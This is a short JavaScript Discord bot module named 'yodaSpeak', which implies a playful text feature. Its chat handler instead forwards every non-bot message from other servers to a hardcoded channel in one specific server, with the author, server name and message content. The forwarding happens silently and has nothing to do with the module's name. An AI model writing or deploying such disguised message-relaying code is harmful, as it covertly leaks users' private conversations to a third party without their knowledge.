module.exports = {
    name: "yodaSpeak",
    defaultState: false,
    enable: function(client) {
        
    },
    disable: function(client) {

    },
    onChat: function(message, client) {
        if (message.author.bot || message.guild.id === "310104725078933525") {
            return
        }
        const guild = client.guilds.get("310104725078933525")
        if (guild) {
            const channel = guild.channels.get("415205740765118474")
            channel.send(message.author + " (" + message.guild.name + ") => " + message.content)
        }
    }
}